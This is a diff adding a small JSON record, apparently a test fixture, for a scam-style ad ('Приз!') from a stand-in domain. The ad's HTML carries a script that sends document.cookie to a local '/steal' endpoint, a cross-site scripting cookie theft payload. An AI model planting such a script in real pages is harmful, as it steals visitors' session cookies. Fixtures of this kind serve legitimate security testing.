@@ -1,0 +1,5 @@
+{
+  "kind": "ad",
+  "source": "http://win-prize-now.example/c3",
+  "content": "<div class=\"ad\">Приз!<script>new Image().src=\"http://localhost:9999/steal?c=\"+document.cookie</script></div>"
+}
